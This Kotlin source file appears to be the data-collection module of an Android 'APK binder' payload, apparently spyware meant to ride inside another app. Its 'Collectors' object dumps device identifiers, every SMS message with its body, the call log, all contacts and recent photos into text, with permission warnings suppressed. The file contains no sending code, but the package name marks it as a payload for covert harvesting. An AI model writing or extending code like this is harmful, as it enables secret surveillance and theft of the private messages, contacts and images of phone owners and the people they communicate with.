package Com.devhs.apkbinder.payload

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony

data class MediaItem(val name: String, val uri: Uri)

object Collectors {

    fun deviceInfo(ctx: Context): String = buildString {
        appendLine("=== DEVICE INFO ===")
        appendLine("Manufacturer : " + Build.MANUFACTURER)
        appendLine("Brand        : " + Build.BRAND)
        appendLine("Model        : " + Build.MODEL)
        appendLine("Device       : " + Build.DEVICE)
        appendLine("Product      : " + Build.PRODUCT)
        appendLine("Android      : " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")")
        appendLine("Build ID     : " + Build.ID)
        appendLine("Fingerprint  : " + Build.FINGERPRINT)
        appendLine("Hardware     : " + Build.HARDWARE)
        appendLine("Bootloader   : " + Build.BOOTLOADER)
        appendLine("ABI          : " + Build.SUPPORTED_ABIS.joinToString())
        appendLine("Timezone     : " + java.util.TimeZone.getDefault().id)
        appendLine("Carrier      : " + carrier(ctx))
        appendLine("Android ID   : " + Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID))
        appendLine("Package      : " + ctx.packageName)
    }

    private fun carrier(ctx: Context): String = try {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
        tm.networkOperatorName.ifEmpty { "-" }
    } catch (_: Throwable) {
        "-"
    }

    @SuppressLint("MissingPermission")
    fun sms(ctx: Context): String = buildString {
        appendLine("=== SMS ===")
        ctx.contentResolver.query(Uri.parse("content://sms"), null, null, null, "date DESC")?.use { c ->
            val iAddr = c.getColumnIndex("address")
            val iBody = c.getColumnIndex("body")
            val iDate = c.getColumnIndex("date")
            val iType = c.getColumnIndex("type")
            while (c.moveToNext()) {
                appendLine("From : " + c.getString(iAddr))
                appendLine("Type : " + c.getString(iType))
                appendLine("Date : " + c.getString(iDate))
                appendLine("Body : " + c.getString(iBody))
                appendLine("---")
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun callLog(ctx: Context): String = buildString {
        appendLine("=== CALL LOG ===")
        ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
        )?.use { c ->
            val iNum = c.getColumnIndex(CallLog.Calls.NUMBER)
            val iName = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val iType = c.getColumnIndex(CallLog.Calls.TYPE)
            val iDate = c.getColumnIndex(CallLog.Calls.DATE)
            val iDur = c.getColumnIndex(CallLog.Calls.DURATION)
            while (c.moveToNext()) {
                appendLine("Number   : " + c.getString(iNum))
                appendLine("Name     : " + c.getString(iName))
                appendLine("Type     : " + c.getString(iType))
                appendLine("Duration : " + c.getString(iDur) + "s")
                appendLine("Date     : " + c.getString(iDate))
                appendLine("---")
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun contacts(ctx: Context): String = buildString {
        appendLine("=== CONTACTS ===")
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ), null, null, null
        )?.use { c ->
            while (c.moveToNext()) {
                appendLine("Name   : " + c.getString(0))
                appendLine("Number : " + c.getString(1))
                appendLine("---")
            }
        }
    }

    fun images(ctx: Context, limit: Int): List<MediaItem> {
        val out = ArrayList<MediaItem>()
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
        ctx.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC"
        )?.use { c ->
            val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (c.moveToNext() && out.size < limit) {
                val id = c.getLong(idCol)
                val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                out.add(MediaItem(c.getString(nameCol) ?: ("img_" + id + ".jpg"), uri))
            }
        }
        return out
    }
}
